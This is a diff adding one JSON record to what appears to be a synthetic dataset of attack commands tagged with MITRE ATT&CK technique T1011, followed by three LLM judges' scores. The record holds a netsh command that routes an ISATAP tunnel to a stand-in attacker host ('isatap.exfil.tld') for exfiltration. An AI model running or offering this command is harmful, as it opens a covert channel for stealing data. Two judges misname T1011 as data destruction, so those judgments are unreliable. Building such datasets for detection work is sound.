@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "netsh interface isatap set state state=enabled; netsh interface isatap set router isatap.exfil.tld",
+  "explanation": "Activates ISATAP and points it to a custom router, enabling IPv6-in-IPv4 tunneling as an alternate medium suitable for exfiltration (T1011).",
+  "rationale_steps": [
+    "Enable ISATAP to encapsulate IPv6 over IPv4, creating a distinct communication path.",
+    "Direct the tunnel to an attacker-controlled ISATAP router.",
+    "Use the tunnel to transfer data over IPv6 where monitoring may be weaker."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-9788b456-7845b056",
+  "source_prompt_hash": "9788b456",
+  "timestamp_utc": "2025-09-30T08:11:11.119466Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper syntax for netsh commands, correct use of semicolon as a command separator, and valid parameter formats.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command correctly configures ISATAP tunneling which could potentially be used for exfiltration, it doesn't directly implement the T1011 technique which is about data destruction rather than exfiltration.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T02:30:39.268691Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses standard netsh syntax with valid parameters and a correct command separator, making it perfectly well-formed and parseable.",
+        "semantic_score": 0,
+        "semantic_justification": "The command correctly configures ISATAP for network tunneling, which could be used for exfiltration, but it has no semantic relation whatsoever to the specified T1011 Data Destruction technique.",
+        "combined_score": 2.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T02:30:43.857896Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Two valid netsh commands separated by a PowerShell semicolon with correct context and option syntax.",
+        "semantic_score": 4,
+        "semantic_justification": "Enables ISATAP and sets a custom router to provide an IPv6-in-IPv4 path usable for exfiltration, but it typically requires administrative privileges and additional steps to actually transfer data.",
+        "combined_score": 4.5,
+        "confidence": 0.7,
+        "timestamp": "2025-10-02T02:31:30.056764Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.333,
+    "llm_average_score": 3.667,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
